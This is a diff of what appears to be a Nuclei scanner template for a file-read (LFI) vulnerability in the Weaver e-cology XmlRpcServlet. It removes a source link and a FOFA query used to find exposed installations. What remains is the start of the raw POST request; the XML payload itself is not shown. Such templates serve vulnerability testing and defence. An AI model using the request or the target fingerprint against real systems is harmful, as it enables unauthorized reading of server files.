@@ -3,17 +3,11 @@ info:
   name: 泛微e-cology XmlRpcServlet文件读取漏洞复现
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/mgctm0ubluznk8hr'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: mgctm0ubluznk8hr
-    fofa: ((body="szFeatures" && body="redirectUrl") || (body="rndData" && body="isdx") || (body="typeof poppedWindow" && body="client/jquery.client_wev8.js") || body="/theme/ecology8/jquery/js/zDialog_wev8.js"
 http:
 - raw:
   - 'POST /weaver/org.apache.xmlrpc.webserver.XmlRpcServlet HTTP/1.1
-
-
 
 
     <?xml version="1.0" encoding="UTF-8"?>
